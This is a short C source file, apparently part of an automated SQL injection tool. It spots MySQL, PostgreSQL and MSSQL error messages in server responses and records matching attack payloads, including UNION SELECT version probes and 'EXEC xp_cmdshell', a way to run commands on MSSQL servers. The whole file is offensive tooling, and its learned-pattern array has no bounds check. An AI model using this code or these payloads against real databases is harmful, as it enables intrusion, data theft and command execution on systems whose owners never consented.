// autolearn.c - Learns from server responses
#include <stdio.h>
#include <string.h>

typedef struct {
    char pattern[100];
    char exploit[500];
    int success_rate;
} LearnedPattern;

LearnedPattern learned[100];
int pattern_count = 0;

void learn_from_response(char *response, char *payload_used) {
    // Learn which payloads work
    if(strstr(response, "error in your SQL syntax")) {
        strcpy(learned[pattern_count].pattern, "MySQL error");
        sprintf(learned[pattern_count].exploit, "UNION SELECT @@version");
        learned[pattern_count].success_rate = 90;
        pattern_count++;
    }
    
    if(strstr(response, "Warning: pg_")) {
        strcpy(learned[pattern_count].pattern, "PostgreSQL error");
        sprintf(learned[pattern_count].exploit, "UNION SELECT version()");
        learned[pattern_count].success_rate = 90;
        pattern_count++;
    }
    
    if(strstr(response, "Microsoft OLE DB")) {
        strcpy(learned[pattern_count].pattern, "MSSQL error");
        sprintf(learned[pattern_count].exploit, "EXEC xp_cmdshell");
        learned[pattern_count].success_rate = 95;
        pattern_count++;
    }
}